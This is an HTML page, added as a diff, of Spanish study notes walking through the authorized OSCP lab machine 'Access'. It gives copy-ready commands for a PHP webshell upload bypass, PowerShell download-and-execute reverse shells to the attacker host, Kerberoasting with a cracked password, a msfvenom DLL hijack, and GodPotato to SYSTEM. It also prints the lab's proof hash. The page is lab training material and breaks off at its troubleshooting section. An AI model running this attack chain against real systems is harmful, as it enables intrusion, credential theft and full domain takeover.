@@ -1,0 +1,491 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="claude:viewport-fit-sides" content="cover">
+<title>Máquina Access</title>
+<style>
+:root{
+  --bg:#f4f5f7; --panel:#ffffff; --panel-2:#eceef2; --fg:#1b1f27; --muted:#5b6270;
+  --line:#d8dce3; --accent:#c2621a; --accent-soft:#f3e2d2;
+  --code-bg:#1c2128; --code-fg:#e4e8ee;
+  --good:#1f7a4d; --warn:#9a6a00; --crit:#b2302b; --info:#2563a8;
+  --mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  --sans:"Inter",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#0f1319; --panel:#161b22; --panel-2:#1c222b; --fg:#e6e9ee; --muted:#8b94a3;
+  --line:#2a313b; --accent:#e08c42; --accent-soft:#2a2016;
+  --code-bg:#0b0e13; --code-fg:#dbe2ea;
+  --good:#52c08a; --warn:#d8a43a; --crit:#f0756e; --info:#6aa8e8; color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#0f1319; --panel:#161b22; --panel-2:#1c222b; --fg:#e6e9ee; --muted:#8b94a3;
+  --line:#2a313b; --accent:#e08c42; --accent-soft:#2a2016;
+  --code-bg:#0b0e13; --code-fg:#dbe2ea;
+  --good:#52c08a; --warn:#d8a43a; --crit:#f0756e; --info:#6aa8e8; color-scheme:dark;
+}
+*{box-sizing:border-box}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+body{background:var(--bg);color:var(--fg);font-family:var(--sans);line-height:1.55;margin:0;font-size:15px}
+a{color:var(--accent)}
+img{max-width:100%}
+.wrap{display:grid;grid-template-columns:286px minmax(0,1fr);gap:0;max-width:1480px;margin:0 auto}
+.nav{position:sticky;top:env(safe-area-inset-top,0px);align-self:start;height:100dvh;overflow-y:auto;
+  border-right:1px solid var(--line);background:var(--panel);
+  padding:20px max(14px,env(safe-area-inset-left,0px)) 40px 14px}
+.brand{font-weight:800;font-size:16px;letter-spacing:.3px;display:flex;align-items:center;gap:8px;margin-bottom:4px}
+.brand .dot{width:9px;height:9px;border-radius:50%;background:var(--accent);box-shadow:0 0 0 3px var(--accent-soft);flex:none}
+.brand small{display:block;color:var(--muted);font-weight:500;font-size:11px;letter-spacing:0}
+.search{width:100%;margin:14px 0;padding:9px 11px;border:1px solid var(--line);border-radius:8px;
+  background:var(--panel-2);color:var(--fg);font-family:var(--sans);font-size:13px}
+.search:focus{outline:2px solid var(--accent);outline-offset:1px}
+.nav ul{list-style:none;margin:0;padding:0}
+.nav li a{display:block;padding:6px 10px;border-radius:7px;color:var(--muted);text-decoration:none;
+  font-size:13px;font-weight:500;border-left:2px solid transparent}
+.nav li a:hover{background:var(--panel-2);color:var(--fg)}
+.nav li a.active{color:var(--accent);background:var(--accent-soft);border-left-color:var(--accent);font-weight:600}
+.nav .grp{font-size:10.5px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);
+  margin:16px 0 4px 10px;font-weight:700;opacity:.8}
+.nav .pos a{font-variant-numeric:tabular-nums}
+.main{padding:28px max(18px,env(safe-area-inset-right,0px)) 80px max(18px,env(safe-area-inset-left,0px));min-width:0}
+header.top{margin-bottom:8px}
+header.top h1{font-size:28px;margin:0 0 6px;text-wrap:balance;letter-spacing:-.3px}
+header.top p{color:var(--muted);margin:0;max-width:66ch}
+.mantra{margin:18px 0;padding:14px 16px;border:1px solid var(--line);border-left:3px solid var(--accent);
+  border-radius:8px;background:var(--panel);font-weight:600}
+.mantra span{color:var(--accent)}
+section{margin:30px 0;scroll-margin-top:16px}
+section>h2{font-size:21px;margin:0 0 4px;padding-bottom:7px;border-bottom:2px solid var(--line);
+  display:flex;align-items:center;gap:9px;letter-spacing:-.2px}
+section>h2 .n{font-family:var(--mono);font-size:13px;color:var(--accent);background:var(--accent-soft);
+  padding:2px 8px;border-radius:6px;font-weight:700;flex:none}
+.lead{color:var(--muted);max-width:68ch;margin:6px 0 2px}
+h3{font-size:16px;margin:22px 0 6px;color:var(--fg)}
+h4{font-size:13.5px;margin:16px 0 4px;color:var(--muted);text-transform:uppercase;letter-spacing:.6px}
+p{margin:6px 0;max-width:72ch}
+ul.notes{margin:8px 0;padding-left:20px;max-width:72ch}
+ul.notes li{margin:3px 0}
+.why{font-size:14px;margin:6px 0;max-width:72ch}
+.why b{color:var(--fg)}
+.code{position:relative;background:var(--code-bg);border-radius:9px;margin:9px 0;border:1px solid var(--line)}
+.code pre{margin:0;padding:12px 70px 12px 14px;overflow-x:auto;font-family:var(--mono);font-size:12.5px;
+  line-height:1.55;color:var(--code-fg);white-space:pre}
+.code .cmt{color:#7f8a99}
+.code button.cp{position:absolute;top:7px;right:7px;border:1px solid #3a434f;background:#222932;color:#c9d2dd;
+  border-radius:6px;font-size:11px;padding:3px 8px;cursor:pointer;font-family:var(--sans);opacity:.75}
+.code button.cp:hover{opacity:1;border-color:var(--accent);color:var(--accent)}
+.code button.cp.ok{color:var(--good);border-color:var(--good)}
+.tbl{overflow-x:auto;margin:10px 0;border:1px solid var(--line);border-radius:9px}
+table{border-collapse:collapse;width:100%;font-size:13px;min-width:460px}
+th,td{text-align:left;padding:8px 11px;border-bottom:1px solid var(--line);vertical-align:top}
+th{background:var(--panel-2);font-weight:700;font-size:12px;text-transform:uppercase;letter-spacing:.4px}
+td code,p code,li code,.why code{font-family:var(--mono);font-size:12px;background:var(--panel-2);padding:1px 5px;border-radius:4px}
+tr:last-child td{border-bottom:none}
+.pos-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:10px;margin:14px 0}
+.pos-card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:12px 14px;
+  border-top:3px solid var(--accent);text-decoration:none;color:inherit;display:block}
+.pos-card:hover{border-color:var(--accent)}
+.pos-card .pn{font-family:var(--mono);font-size:11px;color:var(--accent);font-weight:700}
+.pos-card .pt{font-weight:700;font-size:14px;margin:3px 0;color:var(--fg)}
+.pos-card .pd{font-size:12.5px;color:var(--muted)}
+.callout{border-radius:9px;padding:11px 14px;margin:12px 0;border:1px solid var(--line);font-size:13.5px;max-width:74ch}
+.callout.good{border-left:3px solid var(--good)}
+.callout.warn{border-left:3px solid var(--warn)}
+.callout.crit{border-left:3px solid var(--crit)}
+.callout.info{border-left:3px solid var(--info)}
+.callout b{color:var(--fg)}
+.pills{display:flex;flex-wrap:wrap;gap:6px;margin:10px 0}
+.pill{font-size:11px;font-weight:600;padding:3px 9px;border-radius:999px;border:1px solid var(--line);background:var(--panel-2)}
+.next{display:flex;flex-wrap:wrap;gap:6px;align-items:center;font-size:13px;margin:12px 0;
+  background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--good);border-radius:9px;padding:10px 13px}
+.next b{color:var(--good)}
+.k{font-family:var(--mono);font-size:12px;color:var(--accent)}
+.menu-btn{display:none}
+@media(max-width:860px){
+  .wrap{grid-template-columns:1fr}
+  .nav{position:fixed;z-index:40;top:0;left:0;width:84%;max-width:300px;height:100dvh;
+    transform:translateX(-102%);transition:transform .22s ease;
+    box-shadow:0 0 0 100vmax rgba(0,0,0,0);padding-top:max(20px,env(safe-area-inset-top,0px))}
+  .nav.open{transform:translateX(0);box-shadow:0 0 0 100vmax rgba(0,0,0,.45)}
+  .menu-btn{display:inline-flex;position:fixed;z-index:50;top:max(10px,env(safe-area-inset-top,0px));
+    left:12px;align-items:center;gap:7px;background:var(--panel);border:1px solid var(--line);
+    color:var(--fg);border-radius:9px;padding:8px 12px;font-weight:700;font-size:13px;cursor:pointer}
+  .main{padding-top:58px}
+}
+.theme-t{margin-top:18px;font-size:12px;color:var(--muted);background:none;border:1px solid var(--line);
+  border-radius:7px;padding:6px 10px;cursor:pointer}
+.hidden-s{display:none!important}
+.foot{margin-top:40px;padding-top:16px;border-top:1px solid var(--line);color:var(--muted);font-size:12px;max-width:74ch}
+</style>
+</head>
+<body>
+<button class="menu-btn" id="mbtn">☰ Índice</button>
+<div class="wrap">
+<nav class="nav" id="nav">
+  <div class="brand"><span class="dot"></span><div>Máquina Access<small>Walkthrough OSCP · web → DA chain</small></div></div>
+  <input class="search" id="search" placeholder="Buscar comando o técnica…" autocomplete="off">
+  <div class="grp">Resumen</div>
+  <ul>
+    <li><a href="#resumen">Resumen de la máquina</a></li>
+    <li><a href="#cadena">La cadena de un vistazo</a></li>
+    <li><a href="#datos">Credenciales y hosts</a></li>
+  </ul>
+  <div class="grp">Acceso inicial</div>
+  <ul class="pos">
+    <li><a href="#p1">1 · Reconocimiento</a></li>
+    <li><a href="#p2">2 · Foothold: upload bypass</a></li>
+    <li><a href="#p3">3 · Reverse shell (svc_apache)</a></li>
+  </ul>
+  <div class="grp">Movimiento en el dominio</div>
+  <ul class="pos">
+    <li><a href="#p4">4 · Kerberoasting</a></li>
+    <li><a href="#p5">5 · Shell real como svc_mssql</a></li>
+  </ul>
+  <div class="grp">Escalada a SYSTEM</div>
+  <ul class="pos">
+    <li><a href="#p6">6 · SeManageVolumePrivilege</a></li>
+    <li><a href="#p7">7 · DLL hijacking → NETWORK SERVICE</a></li>
+    <li><a href="#p8">8 · GodPotato → SYSTEM</a></li>
+    <li><a href="#p9">9 · Proof</a></li>
+  </ul>
+  <div class="grp">Rescate</div>
+  <ul>
+    <li><a href="#atascado">Troubleshooting / gotchas</a></li>
+    <li><a href="#lecciones">Lecciones clave</a></li>
+  </ul>
+  <button class="theme-t" id="theme">Cambiar tema claro / oscuro</button>
+</nav>
+<main class="main">
+<header class="top">
+  <h1>Máquina Access — walkthrough de inicio a fin</h1>
+  <p>Apuntes de estudio de la máquina <b>Access</b> (laboratorio autorizado OSCP/PEN-200). Web con upload vulnerable → RCE → Kerberoasting en el dominio <code>access.offsec</code> → cadena de privesc hasta <code>NT AUTHORITY\SYSTEM</code>. Cada paso dice <b>qué</b> hace y <b>por qué</b>, con el comando listo para copiar.</p>
+</header>
+
+<div class="mantra">Esta máquina enseña la regla de oro del privesc en Windows: <span>verifica cada paso con un archivo de prueba antes de asumir que un exploit funcionó</span>, y cuando una herramienta "oficial" existe para un abuso de ACL, <span>úsala en vez de un script casero</span> — la propagación de permisos es justo donde se atasca la gente.</div>
+
+<!-- ============ RESUMEN ============ -->
+<section id="resumen">
+<h2><span class="n">00</span>Resumen de la máquina</h2>
+<p class="lead">Access es un host Windows que hace de Domain Controller del dominio <code>access.offsec</code> (hostname <code>SERVER</code>). Expone una web Apache/PHP con una función de tickets que permite subir archivos. De ahí sale todo.</p>
+<div class="pills">
+  <span class="pill">Windows / Active Directory</span>
+  <span class="pill">Apache 2.4.48 + PHP 8.0.7</span>
+  <span class="pill">File upload bypass</span>
+  <span class="pill">Kerberoasting</span>
+  <span class="pill">SeManageVolumePrivilege</span>
+  <span class="pill">DLL hijacking</span>
+  <span class="pill">SeImpersonate / GodPotato</span>
+</div>
+<div class="callout info"><b>Cómo leer estas notas:</b> cada sección es un eslabón de la cadena. El botín de cada paso (<span class="k">una shell, una credencial, un privilegio</span>) te habilita el siguiente. Si repites la máquina, usa el <a href="#cadena">mapa</a> para saber dónde estás.</div>
+</section>
+
+<!-- ============ CADENA ============ -->
+<section id="cadena">
+<h2><span class="n">01</span>La cadena de un vistazo</h2>
+<p class="lead">Nueve pasos, tres fases. Pincha cualquiera para saltar a su detalle.</p>
+<div class="pos-grid">
+  <a class="pos-card" href="#p1"><div class="pn">PASO 1</div><div class="pt">Reconocimiento</div><div class="pd">nmap full → web 80/443, AD. feroxbuster halla <code>Ticket.php</code> con upload.</div></a>
+  <a class="pos-card" href="#p2"><div class="pn">PASO 2</div><div class="pt">Upload bypass</div><div class="pd">Sube <code>.htaccess</code> + webshell <code>.evil</code>. RCE como <code>svc_apache</code>.</div></a>
+  <a class="pos-card" href="#p3"><div class="pn">PASO 3</div><div class="pt">Reverse shell</div><div class="pd">PowerShell TCP reverse shell vía <code>IEX(DownloadString)</code>.</div></a>
+  <a class="pos-card" href="#p4"><div class="pn">PASO 4</div><div class="pt">Kerberoasting</div><div class="pd">Rubeus → hash SPN de <code>svc_mssql</code> → hashcat → <code>trustno1</code>.</div></a>
+  <a class="pos-card" href="#p5"><div class="pn">PASO 5</div><div class="pt">Shell como svc_mssql</div><div class="pd">WinRM falla → <code>Invoke-RunasCs.ps1 -Remote</code> para shell real.</div></a>
+  <a class="pos-card" href="#p6"><div class="pn">PASO 6</div><div class="pt">SeManageVolume</div><div class="pd">Exploit oficial → FullControl recursivo sobre <code>C:\</code>.</div></a>
+  <a class="pos-card" href="#p7"><div class="pn">PASO 7</div><div class="pt">DLL hijacking</div><div class="pd"><code>tzres.dll</code> malicioso + <code>systeminfo</code> → NETWORK SERVICE.</div></a>
+  <a class="pos-card" href="#p8"><div class="pn">PASO 8</div><div class="pt">GodPotato</div><div class="pd"><code>SeImpersonatePrivilege</code> → <code>nt authority\system</code>.</div></a>
+  <a class="pos-card" href="#p9"><div class="pn">PASO 9</div><div class="pt">Proof</div><div class="pd"><code>proof.txt</code> del Administrador. Máquina completa.</div></a>
+</div>
+<div class="callout warn"><b>Por qué la cadena es tan larga:</b> cada cuenta de servicio tiene poco a poco más poder (<code>svc_apache</code> → <code>svc_mssql</code> → NETWORK SERVICE → SYSTEM). No hay un salto mágico: se encadenan abusos pequeños. Documenta <b>qué cuenta eres</b> en cada shell (<code>whoami</code>) o te perderás.</div>
+</section>
+
+<!-- ============ DATOS ============ -->
+<section id="datos">
+<h2><span class="n">02</span>Credenciales y hosts (referencia)</h2>
+<p class="why">Define variables al empezar para copiar comandos sin errores de tipeo. Ajusta la IP de Kali y la del objetivo a tu sesión.</p>
+<div class="code"><pre>export IP=&lt;ip_access&gt;            <span class="cmt"># host objetivo (DC)</span>
+export KALI=&lt;ip_kali&gt;            <span class="cmt"># tu IP de atacante</span>
+export DOMAIN=access.offsec     <span class="cmt"># dominio</span>
+export DCHOST=DC.access.offsec  <span class="cmt"># FQDN del DC (para el SPN)</span></pre></div>
+<div class="tbl"><table>
+<tr><th>Dato</th><th>Valor</th><th>De dónde salió</th></tr>
+<tr><td>Dominio</td><td><code>access.offsec</code></td><td>enum post-foothold</td></tr>
+<tr><td>Hostname DC</td><td><code>SERVER</code></td><td><code>hostname</code> / enum</td></tr>
+<tr><td>Cuenta web</td><td><code>access\svc_apache</code></td><td>RCE del webshell</td></tr>
+<tr><td>Cuenta servicio</td><td><code>svc_mssql : trustno1</code></td><td>Kerberoasting + hashcat</td></tr>
+<tr><td>SPN kerberoasteado</td><td><code>MSSQLSvc/DC.access.offsec</code></td><td><code>setspn -T ... -Q */*</code></td></tr>
+<tr><td>Proof final</td><td><code>b67c5aeb8573218e3bfbc7e9928d4150</code></td><td><code>C:\Users\Administrator\Desktop\proof.txt</code></td></tr>
+</table></div>
+</section>
+
+<!-- ============ PASO 1 · RECON ============ -->
+<section id="p1">
+<h2><span class="n">P1</span>Paso 1 · Reconocimiento</h2>
+<p class="lead"><b>Objetivo:</b> mapear puertos y descubrir la superficie web. Un escaneo completo revela un Windows con AD y una web en 80/443.</p>
+
+<h3>Escaneo de puertos</h3>
+<p class="why"><b>Por qué full port scan:</b> los puertos interesantes de AD y servicios no siempre están en el top-1000. Escanea los 65535 primero, luego lanza scripts/versión sólo sobre los abiertos.</p>
+<div class="code"><pre>nmap -p- --min-rate 2000 -Pn $IP -oN nmap-full.txt
+nmap -p 80,443,88,135,139,389,445,464,636,3268,5985 -sCV $IP -oN nmap-svc.txt
+<span class="cmt"># resultado: Windows AD (DC) + web Apache 2.4.48 / PHP 8.0.7 en 80 y 443</span></pre></div>
+
+<h3>Enumeración web</h3>
+<p class="why"><b>Por qué:</b> la web es la única puerta sin credenciales. <code>whatweb</code> identifica el stack; <code>feroxbuster</code> busca rutas y ficheros ocultos. Aquí aparece <code>Ticket.php</code>, una página con un formulario de subida de archivos.</p>
+<div class="code"><pre>whatweb http://$IP
+feroxbuster -u http://$IP -x php,html,txt -t 50
+<span class="cmt"># hallazgo clave: /Ticket.php  → formulario de upload (campo the_file, multipart)</span></pre></div>
+<div class="next"><b>Botín:</b> <code>Ticket.php</code> acepta subir archivos. Siguiente: evadir el filtro de extensión.</div>
+</section>
+
+<!-- ============ PASO 2 · UPLOAD ============ -->
+<section id="p2">
+<h2><span class="n">P2</span>Paso 2 · Foothold vía file upload bypass</h2>
+<p class="lead"><b>Señal:</b> hay un upload pero filtra extensiones (no deja <code>.php</code>). <b>Técnica:</b> subir primero un <code>.htaccess</code> que le diga a Apache que trate una extensión arbitraria como PHP, luego subir el webshell con esa extensión.</p>
+
+<h3>Por qué funciona el truco del .htaccess</h3>
+<p class="why">El filtro bloquea <code>.php</code>, pero Apache decide qué es "código PHP" por su configuración, no por el nombre. Un <code>.htaccess</code> en la carpeta de uploads con <code>AddType</code> hace que Apache ejecute como PHP cualquier archivo con la extensión que elijas (aquí <code>.evil</code>). El filtro no conoce <code>.evil</code>, así que lo deja pasar.</p>
+
+<h4>1) Subir el .htaccess</h4>
+<div class="code"><pre><span class="cmt"># contenido del archivo .htaccess</span>
+AddType application/x-httpd-php .evil</pre></div>
+<p class="why">Súbelo por el mismo formulario de <code>Ticket.php</code> (campo <code>the_file</code>, multipart). Queda en <code>/uploads/</code>, que tiene <b>directory listing abierto</b> — útil para confirmar que el archivo llegó.</p>
+
+<h4>2) Subir el webshell</h4>
+<div class="code"><pre><span class="cmt"># contenido de shell.evil</span>
+&lt;?php system($_GET["cmd"]); ?&gt;</pre></div>
+
+<h4>3) Confirmar RCE</h4>
+<p class="why">Llama al webshell pasando el comando por el parámetro <code>cmd</code>. Si Apache devuelve la salida de <code>whoami</code>, tienes ejecución remota de comandos.</p>
+<div class="code"><pre>curl "http://$IP/uploads/shell.evil?cmd=whoami"
+<span class="cmt"># → access\svc_apache   (RCE confirmado)</span></pre></div>
+<div class="callout good"><b>Verificación:</b> entra a <code>http://$IP/uploads/</code> en el navegador para ver el listado y confirmar que <code>.htaccess</code> y <code>shell.evil</code> se subieron antes de pelearte con por qué "no ejecuta".</div>
+<div class="next"><b>Botín:</b> RCE como <code>access\svc_apache</code>. Siguiente: pasar de webshell a una shell interactiva.</div>
+</section>
+
+<!-- ============ PASO 3 · REV SHELL ============ -->
+<section id="p3">
+<h2><span class="n">P3</span>Paso 3 · Reverse shell como svc_apache</h2>
+<p class="lead"><b>Por qué:</b> un webshell por GET es incómodo. Quieres una shell interactiva. Como <code>nishang</code> no estaba disponible, se usa un reverse shell TCP de PowerShell servido desde Kali y disparado por el webshell.</p>
+
+<h4>1) Listener en Kali</h4>
+<div class="code"><pre>nc -lvnp 443</pre></div>
+
+<h4>2) Servir el script de reverse shell</h4>
+<p class="why">Pon el <code>.ps1</code> (un reverse shell TCP de PowerShell) en un directorio y levanta un servidor HTTP para que el objetivo lo descargue en memoria.</p>
+<div class="code"><pre>python3 -m http.server 80   <span class="cmt"># desde la carpeta con revshell.ps1</span></pre></div>
+
+<h4>3) Disparar desde el webshell</h4>
+<p class="why"><b>Por qué <code>IEX(DownloadString)</code>:</b> descarga y ejecuta el script en memoria, sin tocar disco. Se lanza a través del parámetro <code>cmd</code> del webshell, URL-encodeado.</p>
+<div class="code"><pre><span class="cmt"># comando que ejecuta el webshell (vía ?cmd=...)</span>
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$KALI/revshell.ps1')"</pre></div>
+<div class="next"><b>Botín:</b> shell interactiva como <code>access\svc_apache</code>. Siguiente: moverse en el dominio con Kerberoasting.</div>
+</section>
+
+<!-- ============ PASO 4 · KERBEROASTING ============ -->
+<section id="p4">
+<h2><span class="n">P4</span>Paso 4 · Kerberoasting</h2>
+<p class="lead"><b>Posición:</b> shell de una cuenta de dominio (<code>svc_apache</code>). <b>Idea:</b> cualquier usuario autenticado puede pedir tickets de servicio (TGS) de cuentas con SPN; ese ticket va cifrado con el hash de la contraseña de la cuenta de servicio, así que se puede crackear offline.</p>
+
+<h4>1) Encontrar cuentas con SPN</h4>
+<p class="why"><code>setspn</code> es nativo de Windows — no levanta sospechas y no necesita subir nada. Busca SPNs en todo el dominio.</p>
+<div class="code"><pre>setspn -T access.offsec -Q */*
+<span class="cmt"># → MSSQLSvc/DC.access.offsec  asociado a la cuenta MSSQL (svc_mssql)</span></pre></div>
+
+<h4>2) Pedir el hash con Rubeus</h4>
+<p class="why">Baja <code>Rubeus.exe</code> con <code>certutil</code> y pide el roast. <code>/nowrap</code> deja el hash en una sola línea para copiarlo limpio.</p>
+<div class="code"><pre><span class="cmt"># en el objetivo</span>
+certutil -urlcache -f http://$KALI/Rubeus.exe C:\ProgramData\Rubeus.exe
+C:\ProgramData\Rubeus.exe kerberoast /nowrap
+<span class="cmt"># → hash $krb5tgs$23$...</span></pre></div>
+
+<h4>3) Crackear con hashcat</h4>
+<p class="why">Modo <code>13100</code> = Kerberos 5 TGS-REP etype 23. Con <code>rockyou</code> cae rápido porque la contraseña es débil.</p>
+<div class="code"><pre>hashcat -m 13100 kerb_hash.txt /usr/share/wordlists/rockyou.txt
+<span class="cmt"># → svc_mssql : trustno1</span></pre></div>
+<div class="callout info"><b>Dato para el examen:</b> si <code>certutil</code> da errores de WinHTTP (ver <a href="#atascado">troubleshooting</a>), usa <code>curl.exe</code> o <code>Invoke-WebRequest</code> para bajar <code>Rubeus.exe</code>.</div>
+<div class="next"><b>Botín:</b> credenciales <code>svc_mssql : trustno1</code>. Siguiente: conseguir una shell real como ese usuario.</div>
+</section>
+
+<!-- ============ PASO 5 · RUNAS ============ -->
+<section id="p5">
+<h2><span class="n">P5</span>Paso 5 · Shell real como svc_mssql</h2>
+<p class="lead"><b>Problema:</b> tienes credenciales válidas pero no puedes usarlas como esperas. Hay que elegir bien la herramienta.</p>
+
+<h3>Por qué WinRM no sirve aquí</h3>
+<p class="why"><code>evil-winrm</code> falla con <code>WinRMAuthorizationError</code>: <code>svc_mssql</code> <b>no está</b> en el grupo <i>Remote Management Users</i>, así que no tiene permiso de WinRM. <code>netexec winrm</code> lo confirma (no sale <code>Pwn3d!</code>). En cambio <code>netexec smb</code> <b>sí</b> autentica — las credenciales son correctas, el problema es el canal.</p>
+<div class="code"><pre>netexec smb  $IP -u svc_mssql -p 'trustno1'   <span class="cmt"># [+] autentica</span>
+netexec winrm $IP -u svc_mssql -p 'trustno1'  <span class="cmt"># sin Pwn3d! → WinRM cerrado</span></pre></div>
+
+<h3>La solución: Invoke-RunasCs.ps1 con -Remote</h3>
+<p class="why">El binario <code>RunasCs.exe</code> fallaba por el <b>logon type / UAC</b> con una cuenta de dominio limitada. El script <code>Invoke-RunasCs.ps1</code> (de antonioCoco/RunasCs) con <code>-Remote</code> es más fiable: crea el proceso como <code>svc_mssql</code> y te devuelve una reverse shell interactiva real. Se lanza desde la shell que ya tienes de <code>svc_apache</code>.</p>
+<div class="code"><pre><span class="cmt"># listener en Kali</span>
+nc -lvnp 443
+
+<span class="cmt"># cargar y ejecutar el script desde la shell de svc_apache</span>
+IEX(New-Object Net.WebClient).DownloadString('http://$KALI/Invoke-RunasCs.ps1')
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote $KALI:443</pre></div>
+<div class="next"><b>Botín:</b> reverse shell <code>cmd.exe</code> autenticada como <code>access\svc_mssql</code>. Siguiente: escalar privilegios locales.</div>
+</section>
+
+<!-- ============ PASO 6 · SeManageVolume ============ -->
+<section id="p6">
+<h2><span class="n">P6</span>Paso 6 · Privesc con SeManageVolumePrivilege</h2>
+<p class="lead"><b>Señal:</b> <code>whoami /priv</code> como <code>svc_mssql</code> muestra <code>SeManageVolumePrivilege</code>. Aunque figura <i>Disabled</i>, el exploit lo habilita él mismo. Este privilegio permite reescribir ACLs y acaba otorgando control total sobre <code>C:\</code>.</p>
+
+<h4>1) Confirmar el privilegio</h4>
+<div class="code"><pre>whoami /priv
+<span class="cmt"># SeManageVolumePrivilege ... Disabled  (el exploit lo habilita solo)</span></pre></div>
+
+<h4>2) Elegir un directorio escribible</h4>
+<p class="why"><b>Gotcha importante:</b> <code>C:\Windows\Temp</code> <b>no</b> era escribible para <code>svc_mssql</code> (permission denied). Trabaja desde <code>C:\ProgramData</code>, que sí lo es. Verifica siempre con un archivo de prueba antes de subir el exploit.</p>
+<div class="code"><pre>echo test &gt; C:\ProgramData\poc.txt &amp;&amp; dir C:\ProgramData\poc.txt
+<span class="cmt"># si el dir lo lista, la carpeta es escribible</span></pre></div>
+
+<h4>3) Ejecutar el exploit oficial</h4>
+<p class="why"><b>Por qué el exploit oficial y no un script casero:</b> la herencia de ACL puede estar bloqueada en subcarpetas protegidas. Un script casero de ACL sobre <code>C:\</code> puede <b>no propagarse</b> a <code>System32</code>. El exploit oficial (CsEnox/SeManageVolumeExploit) sí logra la propagación recursiva.</p>
+<div class="code"><pre>certutil -urlcache -f http://$KALI/SeManageVolumeExploit.exe C:\ProgramData\SeManageVolumeExploit.exe
+C:\ProgramData\SeManageVolumeExploit.exe
+<span class="cmt"># → "Entries changed: 927, DONE"  = FullControl para BUILTIN\Users sobre C:\</span></pre></div>
+<div class="callout good"><b>Qué consigues:</b> <code>BUILTIN\Users</code> obtiene <code>FullControl</code> recursivo sobre <code>C:\</code>, propagándose a <code>C:\Windows\System32</code>. Ahora puedes <b>escribir DLLs en System32</b>, lo que habilita el siguiente paso.</div>
+<div class="next"><b>Botín:</b> escritura en <code>C:\Windows\System32</code>. Siguiente: DLL hijacking.</div>
+</section>
+
+<!-- ============ PASO 7 · DLL HIJACK ============ -->
+<section id="p7">
+<h2><span class="n">P7</span>Paso 7 · DLL hijacking → NETWORK SERVICE</h2>
+<p class="lead"><b>Idea:</b> algunos binarios del sistema intentan cargar una DLL que normalmente <b>no existe</b>. Si puedes escribir esa DLL (gracias al paso 6), el binario la cargará con el contexto de quien lo ejecute.</p>
+
+<h3>Por qué tzres.dll + systeminfo</h3>
+<p class="why"><code>systeminfo.exe</code> carga <code>C:\Windows\System32\wbem\tzres.dll</code>, un archivo que suele estar ausente o es reemplazable. Al colocar ahí una DLL maliciosa y ejecutar <code>systeminfo</code>, Windows carga nuestra DLL y obtenemos ejecución como <code>nt authority\network service</code>.</p>
+
+<h4>1) Generar la DLL maliciosa (en Kali)</h4>
+<div class="code"><pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f dll -o tzres.dll</pre></div>
+
+<h4>2) Colocarla y disparar</h4>
+<div class="code"><pre><span class="cmt"># listener en Kali</span>
+nc -lvnp 4444
+
+<span class="cmt"># en el objetivo: copiar la DLL a la ruta que systeminfo busca</span>
+copy C:\ProgramData\tzres.dll C:\Windows\System32\wbem\tzres.dll
+systeminfo
+<span class="cmt"># → reverse shell como nt authority\network service</span></pre></div>
+<div class="next"><b>Botín:</b> shell como <code>nt authority\network service</code>. Siguiente: de NETWORK SERVICE a SYSTEM con SeImpersonate.</div>
+</section>
+
+<!-- ============ PASO 8 · GODPOTATO ============ -->
+<section id="p8">
+<h2><span class="n">P8</span>Paso 8 · Privesc final a SYSTEM con GodPotato</h2>
+<p class="lead"><b>Señal:</b> <code>whoami /priv</code> como NETWORK SERVICE muestra <code>SeImpersonatePrivilege: Enabled</code>. Ese privilegio es la puerta directa a SYSTEM mediante los "potatoes".</p>
+
+<h3>Por qué GodPotato</h3>
+<p class="why">Las cuentas de servicio (NETWORK SERVICE, LOCAL SERVICE, cuentas de IIS/MSSQL) suelen tener <code>SeImpersonatePrivilege</code>. GodPotato abusa de él forzando a un servicio privilegiado a autenticarse y suplantando su token para ejecutar como SYSTEM. Funciona en un rango amplio de versiones de Windows donde JuicyPotato ya no.</p>
+<div class="code"><pre>whoami /priv
+<span class="cmt"># SeImpersonatePrivilege ... Enabled  → vía directa a SYSTEM</span>
+
+certutil -urlcache -f http://$KALI/GodPotato-NET4.exe C:\ProgramData\GodPotato-NET4.exe
+C:\ProgramData\GodPotato-NET4.exe -cmd "cmd /c whoami"
+<span class="cmt"># → nt authority\system</span></pre></div>
+<div class="callout good"><b>Para una shell completa:</b> en vez de <code>whoami</code>, pásale un comando que lance una reverse shell como SYSTEM, p. ej. <code>-cmd "cmd /c C:\ProgramData\nc.exe $KALI 5555 -e cmd.exe"</code>.</div>
+<div class="next"><b>Botín:</b> ejecución como <code>nt authority\system</code>. Siguiente: leer la prueba.</div>
+</section>
+
+<!-- ============ PASO 9 · PROOF ============ -->
+<section id="p9">
+<h2><span class="n">P9</span>Paso 9 · Proof</h2>
+<p class="why">Como SYSTEM lees cualquier archivo, incluida la prueba del Administrador. En el OSCP, captura <code>whoami</code> + <code>ipconfig</code> + el contenido del proof en la misma pantalla.</p>
+<div class="code"><pre>type C:\Users\Administrator\Desktop\proof.txt
+<span class="cmt"># → b67c5aeb8573218e3bfbc7e9928d4150</span></pre></div>
+<div class="callout good"><b>Máquina completa.</b> Cadena: web upload → <code>svc_apache</code> → Kerberoasting → <code>svc_mssql</code> → SeManageVolume → DLL hijack → NETWORK SERVICE → GodPotato → SYSTEM.</div>
+</section>
+
+<!-- ============ TROUBLESHOOTING ============ -->
+<section id="atascado">
+<h2><span class="n">TR</span>Troubleshooting / gotchas</h2>
+<p class="lead">Los puntos donde esta máquina se atasca de verdad. Ténlos a mano para no repetir el bloqueo.</p>
+
+<h3>1 · La herencia de ACL puede estar bloqueada</h3>
